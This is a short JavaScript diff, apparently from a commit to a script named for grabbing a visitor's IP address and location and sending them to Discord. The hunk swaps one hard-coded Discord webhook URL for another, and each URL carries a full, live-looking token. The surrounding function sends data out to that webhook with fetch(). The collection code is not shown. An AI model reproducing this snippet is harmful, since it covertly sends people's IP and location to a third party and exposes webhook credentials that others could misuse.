@@ -25,7 +25,7 @@ async function getIPAndLocationAndSendToDiscord() {
 
 // Function to send message to Discord using webhook
 async function sendToDiscord(message) {
-    const webhookURL = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/1231897922509996093/m747ZtKM1CnTXp4o_MHXcKCnarPZ-2oyUvXMgwjrpFmmA-VMqqqj_nP7Y5VIhHKwHNsr'; // Replace YOUR_DISCORD_WEBHOOK_URL with your actual webhook URL
 
     // Send the message to Discord
     await fetch(webhookURL, {
